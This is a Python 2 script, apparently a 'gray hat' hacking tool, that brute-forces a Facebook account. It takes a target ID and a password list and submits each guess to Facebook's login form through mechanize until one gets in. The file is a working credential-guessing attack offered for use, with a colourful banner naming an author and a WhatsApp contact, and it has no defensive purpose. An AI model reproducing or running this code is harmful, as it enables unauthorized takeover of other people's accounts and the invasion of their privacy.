#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To BOTOL
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020

import os, sys, mechanize, cookielib, random, time
os.system('clear')

def runntek(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(10.0 / 100)

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

if sys.platform == 'linux' or sys.platform == 'linux2':
    GL = '\x1b[96;1m'
    BB = '\x1b[34;1m'
    YY = '\x1b[33;1m'
    GG = '\x1b[32;1m'
    WW = '\x1b[0;1m'
    RR = '\x1b[31;1m'
    CC = '\x1b[36;1m'
    B = '\x1b[34m'
    Y = '\x1b[33;1m'
    G = '\x1b[32m'
    W = '\x1b[0;1m'
    R = '\x1b[31m'
    C = '\x1b[36;1m'
    rand = (BB, YY, GG, WW, RR, CC)
    P = random.choice(rand)
#Dev:Botol_Mehedi
##### LOGO #####
logo= """
\033[1;91m            _      _
\033[1;92m           (c\-.--/a)
\033[1;93m            |q: p   /\_            _____
\033[1;94m          __\(_/  ).'  '---._.---'`     '---.__
\033[1;95m         /  (Y_)_/             /        : \-._ \
\033[1;96m !!!!,,, \_))'-';             (       _/   \  '\\_
\033[1;97m!!II!!!!!IIII,, \_             \     /      \_  '.\
\033[1;91m !IIsndIIIII!!!!,,\     /_      \   |----.___ '-. \'.__
\033[1;92m !!!IIIIIIIIIIIIIIII\   | '--._.-'  _)       \  |  `'--'
\033[1;93m     '''!!!!IIIIIII/   .',, ((___.-'         / /
\033[1;94m           '''!!!!/  _/!!!!IIIIIII!!!!!,,,,,;,;,,,.....
\033[1;95m                 | /IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
\033[1;96m                 | \   ''IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
\033[1;97m                 \_,)     '''''!!!!IIIIIIIIIIIIIIII!!!!!!!!
\033[1;97m                                   ''''''''''!!!!!!!!!!!!!! 
                                              \033[1;93m        IT'S NOT JUST A NAME, IT'S A BRAND
\033[1;97m--------------------------------------------------
\033[1;95m
 AUTHOR     :           FAROOQ ANSARI
 WHATSAPP NO  : 03132197796
 WHATSAPP GROUP    : GRAY HAT HACKER
 NOT     :             DON,T CALL ME ONLY TEXT
\033[1;32m
--------------------------------------------------
                                '''


print logo
print
email = str(raw_input(GG + '[?]' + YY + ' ENTER TARGET ID' + B + ' : '))
passwordlist = str(raw_input(GG + '[?]' + YY + ' PASSWORD LIST (Type password-list-pak.txt)' + B + ' : '))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [
 ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]

def runntek(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(10.0 / 100)


def main():
    global br
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    welcome()
    lagi()
    search()
    print ' '
    print
    runntek(R + 'BAD LUCK. BECAUSE PASSWORD NOT FOUND.')
    runntek(R + 'PLEASE USE NEW PASSWORDS LIST. ')
    time.sleep(1)
    print
    print WW + ' THANKS FOR USING OUR TOOLS '


def brute(password):
    sys.stdout.write(W + ('\r[+]  TRYING..... {}').format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and 'login_attempt' not in log:
    	print ('\033[1;95mPASSWORD CRACKED SUCCESSFULLY')
        print ('\x1b[92;1m\n\n[+]\x1b[97;1m THE PASSWORD IS : \x1b[31;1m===> \x1b[96;1m{}').format(password)
        print ' '
        raw_input(CC + '......PRESS ENTER TO EXIT.....')
        sys.exit(1)

os.system('clear')

def search():
    global password
    passwords = open(passwordlist, 'r')
    for password in passwords:
        passwords = password.replace('\n', '')
        brute(password)


def welcome():
    print GG + '\n     \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n     \xe2\x80\x96  B   O   T   O   L   B   A   B   A \xe2\x80\x96\n     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n     |    \xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97     \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97     |\n     |    \xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x94\xe2\x95\x9d     \xe2\x95\x91\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91     |\n     |    \xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\xa0\xe2\x95\xa3\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97     \xe2\x95\x91\xe2\x95\x94\xe2\x95\x9d \xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91     |\n     |    \xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d     |\n     |\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90|\n      '


def lagi():
    total = open(passwordlist, 'r')
    total = total.readlines()
    print WW + ('     [*] ACCOUNT ID : {}').format(email)
    print WW + '     [*] PASSWORDS  :', len(total), WW + 'passwords'
    print WW + '     [*] PLEASE WAIT.CRACKING STARTED .....\n\n'


if __name__ == '__main__':
    main()

